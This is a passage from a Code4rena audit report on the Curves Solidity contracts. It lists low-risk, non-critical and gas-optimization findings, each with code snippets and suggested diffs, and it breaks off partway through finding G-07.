[klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/359), [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/262), [m4ttm](https://github.com/code-423n4/2024-01-curves-findings/issues/1513), [John\_Femi](https://github.com/code-423n4/2024-01-curves-findings/issues/1506), [fouzantanveer](https://github.com/code-423n4/2024-01-curves-findings/issues/1505), [0xepley](https://github.com/code-423n4/2024-01-curves-findings/issues/1498), [ahmedaghadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1485), [adeolu](https://github.com/code-423n4/2024-01-curves-findings/issues/1479), [Nachoxt17](https://github.com/code-423n4/2024-01-curves-findings/issues/1470), [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1469), [jatin\_19](https://github.com/code-423n4/2024-01-curves-findings/issues/1439), [Josephdara\_0xTiwa](https://github.com/code-423n4/2024-01-curves-findings/issues/1421), [mitev](https://github.com/code-423n4/2024-01-curves-findings/issues/1415), [karanctf](https://github.com/code-423n4/2024-01-curves-findings/issues/1412), [Nikki](https://github.com/code-423n4/2024-01-curves-findings/issues/1368), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1364), [ptsanev](https://github.com/code-423n4/2024-01-curves-findings/issues/1347), [Faith](https://github.com/code-423n4/2024-01-curves-findings/issues/1297), [imare](https://github.com/code-423n4/2024-01-curves-findings/issues/1261), [kiki](https://github.com/code-423n4/2024-01-curves-findings/issues/1250), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1248), [spaghetticode\_sentinel](https://github.com/code-423n4/2024-01-curves-findings/issues/1218), [JayShreeRAM](https://github.com/code-423n4/2024-01-curves-findings/issues/1209), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1201), [0xhashiman](https://github.com/code-423n4/2024-01-curves-findings/issues/1160), [slylandro\_star](https://github.com/code-423n4/2024-01-curves-findings/issues/1140), [hihen](https://github.com/code-423n4/2024-01-curves-findings/issues/1137), [0xmuxyz](https://github.com/code-423n4/2024-01-curves-findings/issues/1094), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1077), [jacopod](https://github.com/code-423n4/2024-01-curves-findings/issues/1037), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1007), [Draiakoo](https://github.com/code-423n4/2024-01-curves-findings/issues/946), [LeoGold](https://github.com/code-423n4/2024-01-curves-findings/issues/944), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/933), [opposingmonkey](https://github.com/code-423n4/2024-01-curves-findings/issues/923), [polarzero](https://github.com/code-423n4/2024-01-curves-findings/issues/906), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/904), [0xc0ffEE](https://github.com/code-423n4/2024-01-curves-findings/issues/857), [almurhasan](https://github.com/code-423n4/2024-01-curves-findings/issues/839), [jesjupyter](https://github.com/code-423n4/2024-01-curves-findings/issues/838), [codegpt](https://github.com/code-423n4/2024-01-curves-findings/issues/828), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/814), [DanielArmstrong](https://github.com/code-423n4/2024-01-curves-findings/issues/797), [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/796), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/782), [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/751), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/725), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/716), [amaechieth](https://github.com/code-423n4/2024-01-curves-findings/issues/709), [khramov](https://github.com/code-423n4/2024-01-curves-findings/issues/706), [para8956](https://github.com/code-423n4/2024-01-curves-findings/issues/670), [Shubham](https://github.com/code-423n4/2024-01-curves-findings/issues/662), [Lalanda](https://github.com/code-423n4/2024-01-curves-findings/issues/643), [Topmark](https://github.com/code-423n4/2024-01-curves-findings/issues/637), [0xfave](https://github.com/code-423n4/2024-01-curves-findings/issues/613), [n1punp](https://github.com/code-423n4/2024-01-curves-findings/issues/592), [pep7siup](https://github.com/code-423n4/2024-01-curves-findings/issues/555), [spacelord47](https://github.com/code-423n4/2024-01-curves-findings/issues/537), [danb](https://github.com/code-423n4/2024-01-curves-findings/issues/530), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/521), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/505), [jovemjeune](https://github.com/code-423n4/2024-01-curves-findings/issues/498), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/457), [0xSwahili](https://github.com/code-423n4/2024-01-curves-findings/issues/437), [cartlex\_](https://github.com/code-423n4/2024-01-curves-findings/issues/424), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/413), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/397), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/391), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/377), [zaevlad](https://github.com/code-423n4/2024-01-curves-findings/issues/364), [KmanOfficial](https://github.com/code-423n4/2024-01-curves-findings/issues/341), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/340), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/315), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/269), [developerjordy](https://github.com/code-423n4/2024-01-curves-findings/issues/214), [Oxsadeeq](https://github.com/code-423n4/2024-01-curves-findings/issues/210), [pkqs90](https://github.com/code-423n4/2024-01-curves-findings/issues/204), [twcctop](https://github.com/code-423n4/2024-01-curves-findings/issues/184), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/177), [Inference](https://github.com/code-423n4/2024-01-curves-findings/issues/161), [lil\_eth](https://github.com/code-423n4/2024-01-curves-findings/issues/154), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/151), [israeladelaja](https://github.com/code-423n4/2024-01-curves-findings/issues/104), [ziyou-](https://github.com/code-423n4/2024-01-curves-findings/issues/88), and [Tigerfrake](https://github.com/code-423n4/2024-01-curves-findings/issues/33).*

## [L-01] Deposit Function and ERC20 Token Management

`Curves.deposit()` enforces a condition that only whole numbers of Ether can be deposited, potentially complicating the user experience in ERC20 token management. This restriction, aimed at simplifying internal accounting, might not align well with common cryptocurrency practices where fractional token ownership is standard. Users who trade or transact with these tokens may face challenges when redepositing fractional amounts back into the contract. This would mean `amount % 1 ether` would mandate up to 0.9999... ETH worth of external token non-depositable for a user. Balancing contract simplicity with user convenience and market norms is crucial for optimal functionality and user satisfaction.

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L490-L491

```solidity
    function deposit(address curvesTokenSubject, uint256 amount) public {
        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();
```

## [L-02] Optimizing Fee Calculation to Minimize Rounding Errors

In `Curves.getFees()`, the current methodology calculates each fee component (`protocolFee`, `subjectFee`, `referralFee`, `holdersFee`) separately from the transaction price, leading to potential rounding errors due to Solidity's integer arithmetic. An alternative approach, where the `totalFee` is calculated first as a cumulative percentage of the price, and then `protocolFee` is derived by subtracting other fees from `totalFee`, could reduce these rounding discrepancies. The key is to align the method with the contract's fee structure while ensuring precision, especially important in financial transactions where even minimal rounding errors can accumulate significantly over time.

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L173-L177

```solidity
        protocolFee = (price * feesEconomics.protocolFeePercent) / 1 ether;
        subjectFee = (price * feesEconomics.subjectFeePercent) / 1 ether;
        referralFee = (price * feesEconomics.referralFeePercent) / 1 ether;
        holdersFee = (price * feesEconomics.holdersFeePercent) / 1 ether;
        totalFee = protocolFee + subjectFee + referralFee + holdersFee;
```

## [L-03] Essential Recovery Function for Exported ERC20 Tokens in the Curves Protocol

Implementing a recovery function for exported ERC20 tokens in the Curves smart contract is critical for maintaining the integrity of its ecosystem, where the ERC20 token supply must precisely mirror the value locked within the protocol, as highlighted by the protocol in the readme section: 

"For any token associated with Curves, it's imperative that the total ERC20 supply remains exactly equivalent to the value locked within the Curves protocol. This one-to-one correspondence ensures consistency and integrity between the ERC20 tokens in circulation and the underlying assets within the Curves ecosystem."

This function addresses the risk of accidental token deposits, ensuring the protocol's balance and consistency. It necessitates strict access control, comprehensive testing, and transparency to maintain user trust and prevent unauthorized access. This feature not only acts as a safeguard against user errors but also reinforces the reliability and stability of the Curves protocol, ensuring that the total ERC20 supply accurately reflects the underlying assets, thus upholding the ecosystem's integrity and trustworthiness.

Here's a suggested fix that will have a side benefit of retrieving any other non-exported ERC20 tokens if need be:

```solidity
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';

using SafeERC20 for IERC20;

    function recoverERC20(address token_, uint256 amount, address recipient) external onlyOwner {
        if (amount > 0) {
            IERC20(token_).safeTransfer(recipient, amount);
            emit ERC20Recovered(token_, amount);
        }
    }
```

## [L-04] Implementing a Modifier for `updateFeeCredit` function

With numerous vulnerabilities needing `updateFeeCredit()` to be called pre or post critical functions I have reported separately, I suggest the protocol introduce two separate modifiers in Security.sol as follows:

This will concern [Curves._buyCurvesToken()](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L263), [Curves.sellCurvesToken()](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L282), [Curves.withdraw()](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L465), and [FeeSplitteronBalanceChange()](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/FeeSplitter.sol#L96):  

```solidity
    modifier preUpdateFeeCredit(address token, address account) {
        feeRedistributor.updateFeeCredit(token, account);
        _;
    } 
```

This will concern [Curves.deposit()](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L490):

```solidity
    modifier postUpdateFeeCredit(address token, address account) {
        _;
        feeRedistributor.updateFeeCredit(token, account);
    } 
```

## [L-05] ETH Liquidity Challenges in Curves.sol

In the realm of decentralized finance, the design of smart contracts plays a pivotal role in maintaining market stability and user trust. A crucial aspect of this design is ensuring adequate liquidity, particularly in scenarios where there's a surge in selling activity. Contracts that solely rely on token purchases as their ETH source:

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L211

```solidity
    function buyCurvesToken(address curvesTokenSubject, uint256 amount) public payable {
```

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L369

```solidity
    ) public payable {
```

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L383

```solidity
    ) public payable onlyTokenSubject(curvesTokenSubject) {
```

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L408

```solidity
    ) public payable {
```

May face challenges in fulfilling [sell orders](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L232-L233) if the demand to sell surpasses the available ETH, leading to potential liquidity crises.

Apparently, the quadratic bonding formula might not guarantee a zero sum game, i.e. the gain of users buying low and selling high exactly matches the loss of users buying high and selling low. This could lead to tapping into ETH reserve belonging to other Curves token subjects which should not be the intended design/purpose.

This situation underscores the importance of incorporating diverse mechanisms such as external ETH funding sources, reserve pools, or dynamic pricing models to safeguard against liquidity shortages. Such proactive measures in smart contract design not only enhance the robustness of the financial ecosystem but also bolster user confidence, ensuring a smoother and more reliable trading experience.

## [NC-01] Optimizing the `_buyCurvesToken` Function for Efficiency and Clarity

Introducing an if block in `Curves._buyCurvesToken()` to check if supply is non-zero before executing `getPrice()` and `getFees()` could significantly enhance transaction efficiency and align with the contract's design of offering a free initial token purchase. 

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L267-L268

```diff
+    uint256 price;
+    if (supply != 0) {
-        uint256 price = getPrice(supply, amount);
+        price = getPrice(supply, amount);
        (, , , , uint256 totalFee) = getFees(price);
+    }
```

## [NC-02] Efficiency Enhancement in Token Transfer Logic

In the Curves smart contract, a proposed optimization for the `_transfer` function has been identified, aimed at enhancing efficiency and state management. This improvement involves modifying the token transfer logic to invoke the `_addOwnedCurvesTokenSubject` function only when a recipient is receiving a specific token type for the first time. By checking if the recipient's balance of the token in question equals the amount being transferred (indicating they previously held none), the function can conditionally update the `ownedCurvesTokenSubjects` list. This change not only prevents redundant list additions, but also ensures cleaner and more accurate tracking of unique token holders. It's a strategic update that aligns with best practices in smart contract development, emphasizing efficiency and precise state management.

https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L313-L319

```diff
    function _transfer(address curvesTokenSubject, address from, address to, uint256 amount) internal {
        if (amount > curvesTokenBalance[curvesTokenSubject][from]) revert InsufficientBalance();

        // If transferring from oneself, skip adding to the list
        if (from != to) {
+            if (curvesTokenBalance[curvesTokenSubject][to] == 0) { 
                _addOwnedCurvesTokenSubject(to, curvesTokenSubject);
+            }
        }
```

## [NC-03] Activate the optimizer

Before deploying your contract, activate the optimizer when compiling using “solc --optimize --bin sourceFile.sol”. By default, the optimizer will optimize the contract assuming it is called 200 times across its lifetime. If you want the initial contract deployment to be cheaper and the later function executions to be more expensive, set it to “ --optimize-runs=1”. Conversely, if you expect many transactions and do not care for higher deployment cost and output size, set “--optimize-runs” to a high number.

```
module.exports = {
solidity: {
version: "0.8.7",
settings: {
 optimizer: {
   enabled: true,
   runs: 1000,
 },
},
},
};
```

Please visit [this site](https://docs.soliditylang.org/en/v0.5.4/using-the-compiler.html#using-the-commandline-compiler) for further information.

Here's one example of instance on opcode comparison that delineates the gas saving mechanism:

```
for !=0 before optimization
PUSH1 0x00
DUP2
EQ
ISZERO
PUSH1 [cont offset]
JUMPI

after optimization
DUP1
PUSH1 [revert offset]
JUMPI
```

Disclaimer: There have been several bugs with security implications related to optimizations. For this reason, Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Please measure the gas savings from optimizations, and carefully weigh them against the possibility of an optimization-related bug. Also, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.

***

# Gas Optimizations

For this audit, 23 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-01-curves-findings/issues/1277) by **c3phas** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-01-curves-findings/issues/1511), [SY\_S](https://github.com/code-423n4/2024-01-curves-findings/issues/1445), [SAQ](https://github.com/code-423n4/2024-01-curves-findings/issues/1311), [shamsulhaq123](https://github.com/code-423n4/2024-01-curves-findings/issues/1305), [Raihan](https://github.com/code-423n4/2024-01-curves-findings/issues/1286), [JCK](https://github.com/code-423n4/2024-01-curves-findings/issues/1270), [slvDev](https://github.com/code-423n4/2024-01-curves-findings/issues/1217), [dharma09](https://github.com/code-423n4/2024-01-curves-findings/issues/999), [hunter\_w3b](https://github.com/code-423n4/2024-01-curves-findings/issues/783), [0xAnah](https://github.com/code-423n4/2024-01-curves-findings/issues/710), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/708), [ahmedaghadi](https://github.com/code-423n4/2024-01-curves-findings/issues/701), [mgf15](https://github.com/code-423n4/2024-01-curves-findings/issues/1430), [naman1778](https://github.com/code-423n4/2024-01-curves-findings/issues/1379), [sivanesh\_808](https://github.com/code-423n4/2024-01-curves-findings/issues/1203), [lsaudit](https://github.com/code-423n4/2024-01-curves-findings/issues/958), [0xta](https://github.com/code-423n4/2024-01-curves-findings/issues/819), [0xhex](https://github.com/code-423n4/2024-01-curves-findings/issues/793), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/765), [K42](https://github.com/code-423n4/2024-01-curves-findings/issues/707), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/601), and [Sathish9098](https://github.com/code-423n4/2024-01-curves-findings/issues/119).*

## Auditor's Disclaimer 

While we try our best to maintain readability in the provided code snippets, some functions have been truncated to highlight the affected portions.

It's important to note that during the implementation of these suggested changes, developers must exercise caution to avoid introducing vulnerabilities. Although the optimizations have been tested prior to these recommendations, it is the responsibility of the developers to conduct thorough testing again.

Code reviews and additional testing are strongly advised to minimize any potential risks associated with the refactoring process.

## Codebase Impressions

The developers have done an excellent job of identifying and implementing some of the most evident optimizations. However, we have identified additional areas where optimization is possible, some of which may not be immediately apparent. Most of this optimizations are not the usually pattern matching findings, the are very specific to this codebase.

## [G-01] Avoid making similar state reads due to how functions are called (Savea 3320 Gas on average)

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L80-L87

|        | Min    | Max | Avg   | 
| ------ | --- | ------- | ----- |
| Before | -    | -   | 77744 | 
| After  | -    | -   | 74424 | 

```solidity
File: /contracts/FeeSplitter.sol
80:    function claimFees(address token) external {
81:        updateFeeCredit(token, msg.sender);
82:        uint256 claimable = getClaimableFees(token, msg.sender);
83:        if (claimable == 0) revert NoFeesToClaim();
84:        tokensData[token].unclaimedFees[msg.sender] = 0;
85:        payable(msg.sender).transfer(claimable);
86:        emit FeesClaimed(token, msg.sender, claimable);
87:    }
```

The function `claimFees` makes two function calls to `updateFeeCredit(token, msg.sender)`  and `getClaimableFees(token, msg.sender)` that are implemented as follows

**`updateFeeCredit()`**

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L71

```solidity
File: /contracts/FeeSplitter.sol
63:    function updateFeeCredit(address token, address account) internal {
64:        TokenData storage data = tokensData[token];
65:        uint256 balance = balanceOf(token, account);
66:        if (balance > 0) {
67:            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
68:            data.unclaimedFees[account] += owed / PRECISION;
69:            data.userFeeOffset[account] = data.cumulativeFeePerToken;
70:        }
71:    }
```

**`getClaimableFees()`**

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L73-L78

```solidity
File: /contracts/FeeSplitter.sol
73:    function getClaimableFees(address token, address account) public view returns (uint256) {
74:        TokenData storage data = tokensData[token];
75:        uint256 balance = balanceOf(token, account);
76:        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
77:        return (owed / PRECISION) + data.unclaimedFees[account];
78:    }
```

The two functions are making two similar  calls, one being a state read `TokenData storage data = tokensData[token]` and the other a function call to `balanceOf(token, account)`
This essentially means, when the function `claimFees()` is called, we end up making unnecessary calls . We can avoid making this similar calls by combining the implementations into one and using it directly inside the `claimFees()` function.

```diff
     function claimFees(address token) external {
-        updateFeeCredit(token, msg.sender);
-        uint256 claimable = getClaimableFees(token, msg.sender);
+        TokenData storage data = tokensData[token];
+        uint256 balance = balanceOf(token, msg.sender);
+        if (balance > 0) {
+            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;
+            data.unclaimedFees[msg.sender] += owed / PRECISION;
+            data.userFeeOffset[msg.sender] = data.cumulativeFeePerToken;
+        }
+        uint256 owed_ = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;
+        uint256 claimable = (owed_ / PRECISION) + data.unclaimedFees[msg.sender];
         if (claimable == 0) revert NoFeesToClaim();
         tokensData[token].unclaimedFees[msg.sender] = 0;
         payable(msg.sender).transfer(claimable);
```

## [G-02] Refactor function mint to only do stores if token is not minted already

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L439-L454

```solidity
File: /contracts/Curves.sol

439:    function mint(address curvesTokenSubject) external onlyTokenSubject(curvesTokenSubject) {
440:        if (
441:        keccak256(abi.encodePacked(externalCurvesTokens[curvesTokenSubject].name)) ==
442:            keccak256(abi.encodePacked("")) ||        443:keccak256(abi.encodePacked(externalCurvesTokens[curvesTokenSubject].symbol)) ==
444:            keccak256(abi.encodePacked(""))
445:        ) {
446:            externalCurvesTokens[curvesTokenSubject].name = DEFAULT_NAME;
447:            externalCurvesTokens[curvesTokenSubject].symbol = DEFAULT_SYMBOL;
448:        }
449:        _mint(
450:            curvesTokenSubject,
451:            externalCurvesTokens[curvesTokenSubject].name,
452:            externalCurvesTokens[curvesTokenSubject].symbol
453:        );
454:    }
```

The function `mint()` starts of by checking for empty name and symbol and assigning them  if they are empty. We then call `_mint()` passing the args from the function `mint`
Function `_mint()`  first checks if the token we intend to mint is already minted and reverts if so. We check this by checking `externalCurvesTokens[curvesTokenSubject].token != address(0)` see the implementation of `_mint()`

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L456-L463

```solidity
    function _mint(
        address curvesTokenSubject,
        string memory name,
        string memory symbol
    ) internal onlyTokenSubject(curvesTokenSubject) {
        if (externalCurvesTokens[curvesTokenSubject].token != address(0)) revert ERC20TokenAlreadyMinted();
        _deployERC20(curvesTokenSubject, name, symbol);
    }
```

Instead of doing all those SSTORES and end up reverting on the check in `_mint` ,we can move the check for `alreadyMinted` to the function `mint()` and just to avoid messing with any other function that might require to use `_mint` we can move the `_deployERC20(curvesTokenSubject, name, symbol)` call to the main function. The function `mint()` should first check if the token is minted. 

```diff
     function mint(address curvesTokenSubject) external onlyTokenSubject(curvesTokenSubject) {
+        if (externalCurvesTokens[curvesTokenSubject].token != address(0)) revert ERC20TokenAlreadyMinted();
+
         if (
             keccak256(abi.encodePacked(externalCurvesTokens[curvesTokenSubject].name)) ==
             keccak256(abi.encodePacked("")) ||
@@ -446,11 +448,7 @@ contract Curves is CurvesErrors, Security {
             externalCurvesTokens[curvesTokenSubject].name = DEFAULT_NAME;
             externalCurvesTokens[curvesTokenSubject].symbol = DEFAULT_SYMBOL;
         }
-        _mint(
-            curvesTokenSubject,
-            externalCurvesTokens[curvesTokenSubject].name,
-            externalCurvesTokens[curvesTokenSubject].symbol
-        );
+        _deployERC20(curvesTokenSubject, externalCurvesTokens[curvesTokenSubject].name, externalCurvesTokens[curvesTokenSubject].symbol);
     }
```

## [G-03] First token bought should be added directly to the list of owned tokens when using function `_buyCurvesToken` 

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L263-L280

```solidity
File: /contracts/Curves.sol
263:    function _buyCurvesToken(address curvesTokenSubject, uint256 amount) internal {
264:        uint256 supply = curvesTokenSupply[curvesTokenSubject];
265:        if (!(supply > 0 || curvesTokenSubject == msg.sender)) revert UnauthorizedCurvesTokenSubject();

272:        curvesTokenBalance[curvesTokenSubject][msg.sender] += amount;

276:        // If is the first token bought, add to the list of owned tokens
277:        if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
278:            _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
279:        }
280:    }
```

When someone buys the token, we check if it's the first token they have bought and if so we add it to the list of owned tokens. We do this by calling an internal function `_addOwnedCurvesTokenSubject()`, which is implemented as follows:

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L327-L336

```solidity
    // Internal function to add a curvesTokenSubject to the list if not already present
    function _addOwnedCurvesTokenSubject(address owner_, address curvesTokenSubject) internal {
        address[] storage subjects = ownedCurvesTokenSubjects[owner_];
        for (uint256 i = 0; i < subjects.length; i++) {
            if (subjects[i] == curvesTokenSubject) {
                return;
            }
        }
        subjects.push(curvesTokenSubject);
    }
```

The internal function will check if the token already exists and only add if it does not exist. This involves reading the state variable `ownedCurvesTokenSubjects[owner_]` and looping on the list (**very gas intensive**).

However, iteratating on this list is not necessary when we call the function from the function `_buyCurvesToken()` since we only call the internal function when we are guaranteed that this is the first token being bought by the user.

```solidity
        // If is the first token bought, add to the list of owned tokens
        if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
            _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
        }
```

All we need to do is simply add the token directly:

```diff
         // If is the first token bought, add to the list of owned tokens
         if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
-            _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
+            ownedCurvesTokenSubjects[msg.sender].push(curvesTokenSubject);
         }
     }
```

Also, note the comment, this only happens if this is the first token bought, which means it can't be on the list. The check `curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0` ensures no other tokens exists on this users account. This ensures that we handle the case of tokens having been transfered to us.

## [G-04] We can save some SLOADS by refactoring the function `buyCurvesTokenWhitelisted` (Saves 113 Gas on average)

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L404-L420

|        | Min    | Max | Avg   | 
| ------ | --- | ------- | ----- |
| Before | 99264    | 163498   | 126028 | 
| After  | 99115    | 163385   | 125915 | 

```solidity
File: /contracts/Curves.sol
404:    function buyCurvesTokenWhitelisted(
405:        address curvesTokenSubject,
406:        uint256 amount,
407:        bytes32[] memory proof
408:    ) public payable {
409:        if (
410:            presalesMeta[curvesTokenSubject].startTime == 0 ||
411:            presalesMeta[curvesTokenSubject].startTime <= block.timestamp
412:        ) revert PresaleUnavailable();

414:        presalesBuys[curvesTokenSubject][msg.sender] += amount;
415:        uint256 tokenBought = presalesBuys[curvesTokenSubject][msg.sender];
416:        if (tokenBought > presalesMeta[curvesTokenSubject].maxBuy) revert ExceededMaxBuyAmount();

418:        verifyMerkle(curvesTokenSubject, msg.sender, proof);
419:        _buyCurvesToken(curvesTokenSubject, amount);
420:    }
```

On Line 414, we write to storage (`SSTORE + SLOAD`) then make another SLOAD when trying to validate that `tokenBought` won't exceed the `maxBuyAmount`. A more efficient way would be to validate this first then write to storage:

```diff
-        presalesBuys[curvesTokenSubject][msg.sender] += amount;
-        uint256 tokenBought = presalesBuys[curvesTokenSubject][msg.sender];
+        uint256 tokenBought = presalesBuys[curvesTokenSubject][msg.sender] + amount;
         if (tokenBought > presalesMeta[curvesTokenSubject].maxBuy) revert ExceededMaxBuyAmount();

+        presalesBuys[curvesTokenSubject][msg.sender] = tokenBought;
+
         verifyMerkle(curvesTokenSubject, msg.sender, proof);
         _buyCurvesToken(curvesTokenSubject, amount);
     }
```

## [G-05] Function might consume too much which might cause a DOS

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L52-L61

```solidity
File: /contracts/FeeSplitter.sol
52:    function getUserTokensAndClaimable(address user) public view returns (UserClaimData[] memory) {
53:        address[] memory tokens = getUserTokens(user);
54:        UserClaimData[] memory result = new UserClaimData[](tokens.length);
55:        for (uint256 i = 0; i < tokens.length; i++) {
56:            address token = tokens[i];
57:            uint256 claimable = getClaimableFees(token, user);
58:            result[i] = UserClaimData(claimable, token);
59:        }
60:        return result;
61:    }
```

Calling `getUserTokens(user)`  basically tries to retrieve all `userTokens` which are tracked by the mapping `userTokens` and return an array of tokens which we store as `tokens`. If the list is too big, iterating on it would consume too much gas; given, we also call a function `getClaimableFees` which does alot of state loads.

The function `onBalanceChange` is used by the manager to push some more items on the list of `userTokens`. If the manager pushes too many items, looping on them would be too expensive.

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L96-L100

```solidity
    function onBalanceChange(address token, address account) public onlyManager {
        TokenData storage data = tokensData[token];
        data.userFeeOffset[account] = data.cumulativeFeePerToken;
        if (balanceOf(token, account) > 0) userTokens[account].push(token);
    }
```

### Recommendation

We might want to have a limit set for the length.

## [G-06] We should set a limit for the length of the tokens when batching to avoid consuming too much gas

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L103-L117

```solidity
File: /contracts/FeeSplitter.sol
    function batchClaiming(address[] calldata tokenList) external {
        uint256 totalClaimable = 0;
        for (uint256 i = 0; i < tokenList.length; i++) {
            address token = tokenList[i];
            updateFeeCredit(token, msg.sender);
            uint256 claimable = getClaimableFees(token, msg.sender);
            if (claimable > 0) {
                tokensData[token].unclaimedFees[msg.sender] = 0;
                totalClaimable += claimable;
                emit FeesClaimed(token, msg.sender, claimable);
            }
        }
        if (totalClaimable == 0) revert NoFeesToClaim();
        payable(msg.sender).transfer(totalClaimable);
    }
```

As noted by the comment on the code, the batching will fail if the list is too long, utilising the function `getUserTokens()` we can get the number of tokens and then only batch if the code can be executed to completion. Since the loop is calling functions that read and write to state the gas consumption might be too much.

## [G-07] Refactor the function `sellExternalCurvesToken` to avoid making unnecessary state loads (SLOADS) (Saves 304 Gas on average)

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L504-L509

|        | Min    | Max | Avg   | 
| ------ | --- | ------- | ----- |
| Before | -    | -   | 83967 | 
| After  | -    | -   | 83663 | 

```solidity
File: /contracts/Curves.sol
504:    function sellExternalCurvesToken(address curvesTokenSubject, uint256 amount) public {
505:        if (externalCurvesTokens[curvesTokenSubject].token == address(0)) revert TokenAbsentForCurvesTokenSubject();

507:        deposit(curvesTokenSubject, amount);
508:        sellCurvesToken(curvesTokenSubject, amount / 1 ether);
509:    }
```

The function `sellExternalCurvesToken` makes a call to function `deposit` which has the following implementation:

```solidity
490:    function deposit(address curvesTokenSubject, uint256 amount) public {
491:        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();

493:        address externalToken = externalCurvesTokens[curvesTokenSubject].token;
494:        uint256 tokenAmount = amount / 1 ether;

